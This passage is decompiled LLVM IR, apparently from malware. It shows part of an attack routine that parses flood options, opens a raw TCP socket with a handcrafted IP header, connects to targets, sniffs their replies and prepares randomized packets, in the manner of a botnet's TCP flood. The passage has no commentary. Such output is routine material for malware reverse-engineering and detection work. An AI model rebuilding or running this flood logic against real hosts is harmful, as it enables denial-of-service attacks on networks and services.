  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_997c, 16777216
  %v5_999c = sdiv i32 %sext, 16777216
  %v6_999c = inttoptr i32 %v0_9988 to i32*
  %v7_999c = call i32 @attack_get_opt_int(i32 %v0_9994, i32* %v6_999c, i32 5, i32 1, i32 %v5_999c)
  %v1_99a8 = urem i32 %v7_999c, 256
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_99b0 = load i32, i32* @r5, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_99b8 = load i32, i32* @r4, align 4
  store i32 %v0_99b8, i32* %r0.global-to-local, align 4
  %v5_99c0 = inttoptr i32 %v0_99b0 to i32*
  %v6_99c0 = call i32 @attack_get_opt_int(i32 %v0_99b8, i32* %v5_99c0, i32 7, i32 65535, i32 %v1_99a8)
  %v0_99c4 = load i32, i32* @r5, align 4
  store i32 %v0_99c4, i32* %r1.global-to-local, align 4
  %v3_99c8 = mul i32 %v6_99c0, 65536
  store i32 %v3_99c8, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v3_99d8 = urem i32 %v6_99c0, 65536
  store i32 %v3_99d8, i32* @sl, align 4
  %v5_99dc = inttoptr i32 %v0_99c4 to i32*
  %v6_99dc = call i32 @attack_get_opt_int(i32 %v0_99d4, i32* %v5_99dc, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_99e4 = urem i32 %v6_99dc, 256
  store i32 %v1_99e4, i32* %ip.global-to-local, align 4
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99f4 = load i32, i32* @r4, align 4
  store i32 %v0_99f4, i32* %r0.global-to-local, align 4
  %v5_99fc = inttoptr i32 %v0_99e8 to i32*
  %v6_99fc = call i32 @attack_get_opt_int(i32 %v0_99f4, i32* %v5_99fc, i32 12, i32 1, i32 %v1_99e4)
  %v1_9a04 = urem i32 %v6_99fc, 256
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9a08 = load i32, i32* @r5, align 4
  store i32 %v0_9a08, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a14 = load i32, i32* @r4, align 4
  store i32 %v0_9a14, i32* %r0.global-to-local, align 4
  %v5_9a1c = inttoptr i32 %v0_9a08 to i32*
  %v6_9a1c = call i32 @attack_get_opt_int(i32 %v0_9a14, i32* %v5_9a1c, i32 13, i32 1, i32 %v1_9a04)
  %v1_9a24 = urem i32 %v6_9a1c, 256
  store i32 %v1_9a24, i32* %ip.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r5, align 4
  store i32 %v0_9a28, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a34 = load i32, i32* @r4, align 4
  store i32 %v0_9a34, i32* %r0.global-to-local, align 4
  %v5_9a3c = inttoptr i32 %v0_9a28 to i32*
  %v6_9a3c = call i32 @attack_get_opt_int(i32 %v0_9a34, i32* %v5_9a3c, i32 14, i32 1, i32 %v1_9a24)
  %v1_9a44 = urem i32 %v6_9a3c, 256
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9a48 = load i32, i32* @r5, align 4
  store i32 %v0_9a48, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  store i32 %v0_9a54, i32* %r0.global-to-local, align 4
  %v5_9a5c = inttoptr i32 %v0_9a48 to i32*
  %v6_9a5c = call i32 @attack_get_opt_int(i32 %v0_9a54, i32* %v5_9a5c, i32 15, i32 1, i32 %v1_9a44)
  %v1_9a64 = urem i32 %v6_9a5c, 256
  store i32 %v1_9a64, i32* %ip.global-to-local, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  store i32 %v0_9a68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a74 = load i32, i32* @r4, align 4
  store i32 %v0_9a74, i32* %r0.global-to-local, align 4
  %v5_9a7c = inttoptr i32 %v0_9a68 to i32*
  %v6_9a7c = call i32 @attack_get_opt_int(i32 %v0_9a74, i32* %v5_9a7c, i32 16, i32 1, i32 %v1_9a64)
  %v1_9a84 = urem i32 %v6_9a7c, 256
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9a90 = load i32, i32* @r5, align 4
  store i32 %v0_9a90, i32* %r1.global-to-local, align 4
  %v0_9a94 = load i32, i32* @r4, align 4
  store i32 %v0_9a94, i32* %r0.global-to-local, align 4
  %v5_9a9c = inttoptr i32 %v0_9a90 to i32*
  %v6_9a9c = call i32 @attack_get_opt_int(i32 %v0_9a94, i32* %v5_9a9c, i32 0, i32 768, i32 %v1_9a84)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9aac = load i32, i32* @r5, align 4
  store i32 %v0_9aac, i32* %r1.global-to-local, align 4
  %v0_9ab0 = load i32, i32* @r4, align 4
  store i32 %v0_9ab0, i32* %r0.global-to-local, align 4
  %v5_9ab4 = inttoptr i32 %v0_9aac to i32*
  %v6_9ab4 = call i32 @attack_get_opt_int(i32 %v0_9ab0, i32* %v5_9ab4, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9abc = urem i32 %v6_9ab4, 256
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9ad0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v7_9ad4 = icmp eq i32 %v3_9ad0, -1
  store i1 %v7_9ad4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9ad0, i32* @sb, align 4
  br i1 %v7_9ad4, label %dec_label_pc_9cc4, label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9ae8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9ae8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9afc = call i32 @__GI_setsockopt(i32 %v3_9ad0, i32 0, i32 3, i32 %v6_9ae8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9afc, i32* %r0.global-to-local, align 4
  %v7_9b00 = icmp eq i32 %v5_9afc, -1
  store i1 %v7_9b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b00, label %dec_label_pc_9cbc, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9ae0
  %v0_9b08 = load i32, i32* @r7, align 4
  %v3_9b08 = mul i32 %v0_9b08, 65536
  store i32 %v3_9b08, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_9b10 = load i32, i32* @r6, align 4
  %v2_9b10 = icmp eq i32 %v0_9b10, 0
  store i1 %v2_9b10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9b18 = urem i32 %v0_9b08, 65536
  store i32 %v3_9b18, i32* @fp, align 4
  br i1 %v2_9b10, label %dec_label_pc_9f48, label %dec_label_pc_9b20.preheader

dec_label_pc_9b20.preheader:                      ; preds = %dec_label_pc_9b08
  %v2_9b6c = ptrtoint i32* %stack_var_-144 to i32
  %v2_9bb0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9be8 = ptrtoint i32* %stack_var_-80 to i32
  %v2_9bf4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_9bf8 = ptrtoint i32* %stack_var_-48 to i32
  %v4_9c58 = zext i8 %tmp to i32
  %v1_9c5c = and i32 %v4_9c58, 18
  %v2_9c60 = icmp eq i32 %v1_9c5c, 18
  %v3_9c44 = sext i16 %tmp61 to i32
  %v1_9c68 = and i32 %v4_9c58, 5
  %v2_9c68 = icmp eq i32 %v1_9c68, 0
  %v4_9ba8 = add i32 %v2_9b6c, 82
  %v5_9ba8 = inttoptr i32 %v4_9ba8 to i16*
  %v1_9d98 = add i32 %v6_9a9c, 40
  %v1_9eac = urem i32 %v6_99dc, 2
  %tmp97 = sub nsw i32 0, %v1_9eac
  %v4_9eb4 = and i32 %tmp97, 32
  %v1_9ec4 = urem i32 %v6_99fc, 2
  %tmp98 = sub nsw i32 0, %v1_9ec4
  %v4_9ecc = and i32 %tmp98, 16
  %v1_9edc = urem i32 %v6_9a1c, 2
  %tmp99 = sub nsw i32 0, %v1_9edc
  %v4_9ee4 = and i32 %tmp99, 8
  %v1_9ef4 = urem i32 %v6_9a3c, 2
  %tmp100 = sub nsw i32 0, %v1_9ef4
  %v4_9efc = and i32 %tmp100, 4
  %v1_9f0c = urem i32 %v6_9a5c, 2
  %tmp101 = sub nsw i32 0, %v1_9f0c
  %v3_9f14 = and i32 %tmp101, 2
  %v1_9f24 = urem i32 %v6_9a7c, 2
  br label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9b20.preheader, %dec_label_pc_9c94
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9c94 ], [ %tmp34, %dec_label_pc_9b20.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9c94 ], [ %tmp37, %dec_label_pc_9b20.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b2c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9b2c, i32* %r0.global-to-local, align 4
  %v7_9b30 = icmp eq i32 %v3_9b2c, -1
  store i1 %v7_9b30, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9b2c, i32* @r5, align 4
  br i1 %v7_9b30, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9b3c:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9c70
  %v0_9b44 = phi i32 [ %v3_9c84, %dec_label_pc_9c70 ], [ %v3_9b2c, %dec_label_pc_9b20 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_9c70 ], [ %stack_var_-62.0, %dec_label_pc_9b20 ]
  %stack_var_-60.1 = phi i32 [ %v0_9d44, %dec_label_pc_9c70 ], [ %stack_var_-60.0, %dec_label_pc_9b20 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_9b44 = call i32 @__libc_fcntl(i32 %v0_9b44, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9b4c = or i32 %v2_9b44, 2048
  store i32 %v1_9b4c, i32* @r2, align 4
  %v0_9b50 = load i32, i32* @r5, align 4
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  %v2_9b54 = call i32 @__libc_fcntl(i32 %v0_9b50, i32 4)
  %v3_9b58 = load i32, i32* %stack_var_-44, align 4
  %v5_9b60 = mul i32 %v3_9b58, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_9b74 = add i32 %v5_9b60, %arg2
  store i32 %v2_9b74, i32* %r3.global-to-local, align 4
  %v1_9b78 = add i32 %v2_9b74, 20
  %v2_9b78 = inttoptr i32 %v1_9b78 to i8*
  %v3_9b78 = load i8, i8* %v2_9b78, align 1
  %v4_9b78 = zext i8 %v3_9b78 to i32
  store i32 %v4_9b78, i32* %r2.global-to-local, align 4
  %v2_9b7c = icmp ugt i8 %v3_9b78, 30
  %v7_9b7c = icmp eq i8 %v3_9b78, 31
  store i1 %v7_9b7c, i1* %cpsr_z.global-to-local, align 1
  %v2_9b80 = xor i1 %v7_9b7c, true
  %v3_9b80 = and i1 %v2_9b7c, %v2_9b80
  br i1 %v3_9b80, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9b3c
  %v5_9b80 = add i32 %v2_9b74, 16
  %v6_9b80 = inttoptr i32 %v5_9b80 to i32*
  %v7_9b80 = load i32, i32* %v6_9b80, align 4
  store i32 %v7_9b80, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9b3c, %bb
  %v4_9b84 = phi i32 [ %v2_9b74, %dec_label_pc_9b3c ], [ %v7_9b80, %bb ]
  %v4_9b84.stack_var_-60.1 = select i1 %v3_9b80, i32 %v4_9b84, i32 %stack_var_-60.1
  %v2_9b88 = xor i1 %v2_9b7c, true
  %v3_9b88 = or i1 %v7_9b7c, %v2_9b88
  br i1 %v3_9b88, label %dec_label_pc_9cd0, label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %bb71, %dec_label_pc_9cd0
  %v0_9d44 = phi i32 [ %v5_9d20, %dec_label_pc_9cd0 ], [ %v4_9b84.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9b94 = load i32, i32* @sl, align 4
  %v9_9b94 = icmp eq i32 %v0_9b94, 65535
  store i1 %v9_9b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b94, label %dec_label_pc_9d2c, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_9b8c
  %v4_9b98 = udiv i32 %v0_9b94, 256
  %v2_9b9c = urem i32 %v0_9b94, 256
  store i32 %v2_9b9c, i32* %r2.global-to-local, align 4
  %v5_9ba0 = mul nuw nsw i32 %v2_9b9c, 256
  %v6_9ba0 = or i32 %v5_9ba0, %v4_9b98
  store i32 %v6_9ba0, i32* %r3.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  %v2_9ba8 = trunc i32 %v6_9ba0 to i16
  store i16 %v2_9ba8, i16* %v5_9ba8, align 2
  br label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %.thread9, %dec_label_pc_9d2c
  %stack_var_-62.2 = phi i16 [ %v1_9d2c, %dec_label_pc_9d2c ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_9bb0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9bb8 = load i32, i32* @r5, align 4
  store i32 %v0_9bb8, i32* %r0.global-to-local, align 4
  %v3_9bbc = call i32 @__libc_connect(i32 %v0_9bb8, i32 %v2_9bb0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9bc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_9bc4, i32* %r0.global-to-local, align 4
  store i32 %v2_9bc4, i32* @r4, align 4
  %v9_9c24 = icmp eq i32 %tmp35, %v0_9d44
  %v4_9c4c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9c24 to i32
  %v9_9c38 = icmp eq i1 %v9_9c24, false
  %v9_9c50 = icmp eq i32 %v3_9c44, %v4_9c4c
  br label %dec_label_pc_9be0

dec_label_pc_9bd0:                                ; preds = %.thread, %dec_label_pc_9c40, %dec_label_pc_9c68, %bb75
  %v2_9bd0 = call i32 @__GI_time(i32* null)
  %v0_9bd4 = load i32, i32* @r4, align 4
  %v2_9bd4 = sub i32 %v2_9bd0, %v0_9bd4
  store i32 %v2_9bd4, i32* %r0.global-to-local, align 4
  %v7_9bd8 = icmp eq i32 %v2_9bd4, 10
  store i1 %v7_9bd8, i1* %cpsr_z.global-to-local, align 1
  %v8_9bdc = icmp sgt i32 %v2_9bd4, 10
  br i1 %v8_9bdc, label %dec_label_pc_9c70, label %dec_label_pc_9be0

dec_label_pc_9be0:                                ; preds = %dec_label_pc_9bd0, %dec_label_pc_9bb0
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_9bf4, i32* %r1.global-to-local, align 4
  store i32 %v2_9bf8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9c00 = load i32, i32* @sb, align 4
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  %v6_9c08 = call i32 @__libc_recvfrom(i32 %v0_9c00, i32 %v2_9bf4, i32 256, i32 16384, i32 %v2_9be8, i32 %v2_9bf8)
  store i32 %v6_9c08, i32* %r2.global-to-local, align 4
  %v7_9c10 = icmp eq i32 %v6_9c08, -1
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_9c10, label %dec_label_pc_9cc4, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9be0
  store i32 %v0_9d44, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_9c30 = icmp eq i32 %v6_9c08, 40
  store i1 %v7_9c30, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_9c08, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_9c1c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_9bd0

bb75:                                             ; preds = %dec_label_pc_9c1c
  store i1 %v9_9c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c38, label %dec_label_pc_9bd0, label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %bb75
  store i32 %v3_9c44, i32* @lr, align 4
  store i32 %v2_9b6c, i32* @r3, align 4
  store i32 %v4_9c4c, i32* %r2.global-to-local, align 4
  store i1 %v9_9c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c50, label %dec_label_pc_9c58, label %dec_label_pc_9bd0

dec_label_pc_9c58:                                ; preds = %dec_label_pc_9c40
  store i32 %v4_9c58, i32* %r2.global-to-local, align 4
  store i32 %v1_9c5c, i32* @r3, align 4
  store i1 %v2_9c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c60, label %dec_label_pc_9d3c, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c58
  store i1 %v2_9c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c68, label %dec_label_pc_9bd0, label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9bd0
  %v0_9c70 = load i32, i32* @r5, align 4
  store i32 %v0_9c70, i32* %r0.global-to-local, align 4
  %v1_9c74 = call i32 @__GI___libc_close(i32 %v0_9c70)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9c84 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9c84, i32* %r0.global-to-local, align 4
  %v3_9c88 = icmp eq i32 %v3_9c84, -1
  %v8_9c88 = icmp eq i32 %v3_9c84, -1
  store i1 %v8_9c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9c84, i32* @r5, align 4
  br i1 %v3_9c88, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9b20, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_9b20 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_9c70 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_9b20 ], [ %v0_9d44, %bb82 ], [ %v0_9d44, %dec_label_pc_9c70 ]
  %v3_9c94 = load i32, i32* %stack_var_-44, align 4
  %v1_9c98 = add i32 %v3_9c94, 1
  store i32 %v1_9c98, i32* @r3, align 4
  %v1_9c9c = load i32, i32* @r6, align 4
  %v9_9c9c = icmp eq i32 %v1_9c98, %v1_9c9c
  store i1 %v9_9c9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c98, i32* %stack_var_-44, align 4
  %v5_9ca4 = icmp slt i32 %v1_9c98, %v1_9c9c
  br i1 %v5_9ca4, label %dec_label_pc_9b20, label %dec_label_pc_9ca8

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c94
  store i32 %v6_9a9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f58

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9ae0
  %v0_9cbc = load i32, i32* @sb, align 4
  store i32 %v0_9cbc, i32* %r0.global-to-local, align 4
  %v1_9cc0 = call i32 @__GI___libc_close(i32 %v0_9cbc)
  store i32 %v1_9cc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cc4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9be0, %entry, %dec_label_pc_9cbc
  %v1_9ccc = phi i32 [ %v3_9ad0, %entry ], [ %v1_9cc0, %dec_label_pc_9cbc ], [ 0, %dec_label_pc_9be0 ]
  store i32 %v27_98fc, i32* %lr.global-to-local, align 4
  ret i32 %v1_9ccc

dec_label_pc_9cd0:                                ; preds = %bb71
  %v1_9cd0 = add i32 %v4_9b84, 16
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* @r4, align 4
  %v0_9cd4 = call i32 @rand_next()
  store i32 %v0_9cd4, i32* %r0.global-to-local, align 4
  %v3_9cd8 = load i32, i32* %stack_var_-44, align 4
  %v5_9ce0 = mul i32 %v3_9cd8, 24
  %v0_9ce8 = load i32, i32* @r4, align 4
  %v1_9ce8 = and i32 %v0_9ce8, 16711680
  store i32 %v1_9ce8, i32* %ip.global-to-local, align 4
  %v3_9cec = udiv i32 %v0_9ce8, 16777216
  %v2_9cf0 = add i32 %v5_9ce0, %arg2
  store i32 %v2_9cf0, i32* %r1.global-to-local, align 4
  %v4_9cf4 = udiv i32 %v1_9ce8, 256
  %v5_9cf4 = or i32 %v4_9cf4, %v3_9cec
  store i32 %v5_9cf4, i32* %r2.global-to-local, align 4
  %v1_9cf8 = and i32 %v0_9ce8, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_9cf8, i32* %r3.global-to-local, align 4
  %v1_9cfc = add i32 %v2_9cf0, 20
  %v2_9cfc = inttoptr i32 %v1_9cfc to i8*
  %v3_9cfc = load i8, i8* %v2_9cfc, align 1
  %v4_9cfc = zext i8 %v3_9cfc to i32
  store i32 %v4_9cfc, i32* %ip.global-to-local, align 4
  %v4_9d00 = mul i32 %v1_9cf8, 256
  %v4_9d04 = mul i32 %v0_9ce8, 16777216
  %v5_9d00 = or i32 %v4_9d00, %v4_9d04
  %v5_9d04 = or i32 %v5_9d00, %v5_9cf4
  %v7_9d08 = lshr i32 %v0_9cd4, %v4_9cfc
  %v8_9d08 = add i32 %v7_9d08, %v5_9d04
  store i32 %v8_9d08, i32* %r2.global-to-local, align 4
  %v1_9d0c = and i32 %v8_9d08, 16711680
  store i32 %v1_9d0c, i32* %r0.global-to-local, align 4
  %v1_9d18 = and i32 %v8_9d08, 65280
  store i32 %v1_9d18, i32* %r1.global-to-local, align 4
  %v5_9d20 = call i32 @llvm.bswap.i32(i32 %v8_9d08)
  store i32 %v5_9d20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9b8c

dec_label_pc_9d2c:                                ; preds = %dec_label_pc_9b8c
  %v0_9d2c = call i32 @rand_next()
  %v1_9d2c = trunc i32 %v0_9d2c to i16
  store i32 %v0_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v2_9b6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9bb0

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9c58
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9d3c, i32* @r4, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v5_9d44 = mul i32 %v3_9d3c, 16
  %v6_9d44 = add i32 %v5_9d44, %v2_9918
  %v7_9d44 = inttoptr i32 %v6_9d44 to i32*
  store i32 %v0_9d44, i32* %v7_9d44, align 4
  %v0_9d48 = load i32, i32* @r8, align 4
  %v1_9d48 = add i32 %v0_9d48, 4
  %v2_9d48 = inttoptr i32 %v1_9d48 to i32*
  %v3_9d48 = load i32, i32* %v2_9d48, align 4
  store i32 %v3_9d48, i32* %r1.global-to-local, align 4
  %v3_9d50 = udiv i32 %v3_9d48, 16777216
  %v1_9d54 = and i32 %v3_9d48, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_9d54, i32* %r2.global-to-local, align 4
  %v1_9d4c = udiv i32 %v3_9d48, 256
  %v4_9d58 = and i32 %v1_9d4c, 65280
  store i32 %v2_9918, i32* %r0.global-to-local, align 4
  %v4_9d60 = mul i32 %v1_9d54, 256
  %v0_9d64 = load i32, i32* @r4, align 4
  %v3_9d64 = mul i32 %v0_9d64, 16
  %v2_9d68 = add i32 %v3_9d64, %v2_9918
  store i32 %v2_9d68, i32* %ip.global-to-local, align 4
  %v4_9d6c = mul i32 %v3_9d48, 16777216
  %v5_9d58 = or i32 %v4_9d6c, %v3_9d50
  %v5_9d60 = or i32 %v5_9d58, %v4_9d58
  %v5_9d6c = or i32 %v5_9d60, %v4_9d60
  store i32 %v5_9d6c, i32* %r3.global-to-local, align 4
  %v2_9d70 = add i32 %v2_9d68, 4
  %v3_9d70 = inttoptr i32 %v2_9d70 to i32*
  store i32 %v5_9d6c, i32* %v3_9d70, align 4
  %v0_9d74 = load i32, i32* @r8, align 4
  %v1_9d74 = add i32 %v0_9d74, 8
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = and i32 %v3_9d74, 16711680
  store i32 %v1_9d78, i32* %r0.global-to-local, align 4
  %v3_9d7c = udiv i32 %v3_9d74, 16777216
  %v1_9d80 = and i32 %v3_9d74, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v4_9d84 = udiv i32 %v1_9d78, 256
  %v4_9d88 = mul i32 %v1_9d80, 256
  store i32 %v6_9a9c, i32* %r2.global-to-local, align 4
  %v4_9d90 = mul i32 %v3_9d74, 16777216
  %v5_9d84 = or i32 %v4_9d90, %v3_9d7c
  %v5_9d88 = or i32 %v5_9d84, %v4_9d84
  %v5_9d90 = or i32 %v5_9d88, %v4_9d88
  store i32 %v5_9d90, i32* %r3.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d74, 2
  %v2_9d94 = inttoptr i32 %v1_9d94 to i16*
  %v3_9d94 = load i16, i16* %v2_9d94, align 2
  %v4_9d94 = zext i16 %v3_9d94 to i32
  store i32 %v4_9d94, i32* %r1.global-to-local, align 4
  store i32 %v1_9d98, i32* @r7, align 4
  %v0_9d9c = load i32, i32* @lr, align 4
  %v1_9d9c = trunc i32 %v0_9d9c to i16
  %v2_9d9c = load i32, i32* %ip.global-to-local, align 4
  %v3_9d9c = add i32 %v2_9d9c, 14
  %v4_9d9c = inttoptr i32 %v3_9d9c to i16*
  store i16 %v1_9d9c, i16* %v4_9d9c, align 2
  %v0_9da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9da0 = trunc i32 %v0_9da0 to i16
  %v2_9da0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9da0 = add i32 %v2_9da0, 12
  %v4_9da0 = inttoptr i32 %v3_9da0 to i16*
  store i16 %v1_9da0, i16* %v4_9da0, align 2
  %v0_9da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9da4 = load i32, i32* %ip.global-to-local, align 4
  %v2_9da4 = add i32 %v1_9da4, 8
  %v3_9da4 = inttoptr i32 %v2_9da4 to i32*
  store i32 %v0_9da4, i32* %v3_9da4, align 4
  %v0_9da8 = load i32, i32* @r7, align 4
  store i32 %v0_9da8, i32* @r0, align 4
  %v0_9dac = call i32 @malloc()
  store i32 %v0_9dac, i32* %r0.global-to-local, align 4
  store i32 %v2_9928, i32* %r3.global-to-local, align 4
  %v2_9db8 = load i32, i32* @r4, align 4
  %v5_9db8 = mul i32 %v2_9db8, 4
  %v6_9db8 = add i32 %v5_9db8, %v2_9928
  %v7_9db8 = inttoptr i32 %v6_9db8 to i32*
  store i32 %v0_9dac, i32* %v7_9db8, align 4
  %v3_9dbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9dc0 = mul i32 %v3_9dbc, 4
  %v5_9dc0 = add i32 %v0_9dc0, %v4_9dc0
  %v6_9dc0 = inttoptr i32 %v5_9dc0 to i32*
  %v7_9dc0 = load i32, i32* %v6_9dc0, align 4
  store i32 %v7_9dc0, i32* @r4, align 4
  %v1_9dc4 = inttoptr i32 %v7_9dc0 to i8*
